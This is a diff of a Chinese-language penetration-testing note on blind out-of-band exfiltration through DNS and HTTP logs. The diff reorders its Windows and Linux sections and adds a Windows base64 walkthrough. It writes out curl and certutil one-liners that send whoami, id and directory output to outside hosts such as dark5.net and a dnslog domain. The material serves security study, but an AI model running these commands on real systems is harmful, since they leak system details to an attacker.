@@ -23,8 +23,8 @@
         - [Resin](#resin)
 - [DNSlog平台的搭建](#dnslog平台的搭建)
 - [扩展：HTTP log](#扩展http-log)
-- [windows](#windows)
 - [Linux](#linux)
+- [windows](#windows)
 - [参考](#参考)
 
 <!-- /TOC -->
@@ -221,13 +221,6 @@ xxoo.com/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=http://ip.por
 ## 扩展：HTTP log
 &emsp;除开利用DNS的log，在可以执行系统命令的情况还可以利用HTTP的log，就是通过中间件的日志来获取结果。
 
-## windows 
-`for /F %x in ('whoami') do start https://www.dark5.net/%x` #启动浏览器访问
-
-`for /F %x in ('whoami') do certutil.exe -urlcache -split -f https://www.dark5.net/%x` #内置命令行工具访问
-
-`for /F %x in ('dir /b') do certutil.exe -urlcache -split -f https://www.dark5.net/%x` #只列出文件名
-
 ## Linux
 `for /F "delims=\" %i in ('whoami') do curl http://www.dark5.net/%i`
 
@@ -236,6 +229,38 @@ xxoo.com/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=http://ip.por
 curl http://xxx.dnslog.link/$(id|base64)
 curl http://xxx.dnslog.link/`id|base64`
 ```
+
+## windows 
+`for /F %x in ('whoami') do start https://www.dark5.net/%x` #启动浏览器访问
+
+`for /F %x in ('whoami') do certutil.exe -urlcache -split -f https://www.dark5.net/%x` #内置命令行工具访问
+
+`for /F %x in ('dir /b') do certutil.exe -urlcache -split -f https://www.dark5.net/%x` #只列出文件名
+
+
+**windows下的base64编码**
+
+*暂时未找到能直接像Linux那样可以通过管道来加密的，但通过多次命令的执行达到先base64加密，再做HTTP请求*
+```
+whoami > result.txt
+certutil -encode result.txt result_bs64
+for /f %x in (result_bs64) do certutil.exe -urlcache -split -f http://dvwa.dark5.net/%x
+```
+
+![](https://www.github.com/52stu/Images/raw/master/小书匠/1572108688380.png)
+
+
+*每一个请求都会出现两个请求日志，所以要去重复！* 并把结果保存为`result_bs64_local`
+```
+ZGVza3RvcC1xOTl1dHJzXGhhY2tlcg0K
+```
+
+然后再把这个`result_bs64_local`里面加密的文件内容解密，命令为：`certutil -decode result_bs64_local result_local.txt`
+
+![](https://www.github.com/52stu/Images/raw/master/小书匠/1572108884909.png)
+
+![](https://www.github.com/52stu/Images/raw/master/小书匠/1572109060661.png)
+
 
 ## 参考
 [dnslog利用](http://byd.dropsec.xyz/2016/12/04/dnslog%E5%88%A9%E7%94%A8/)
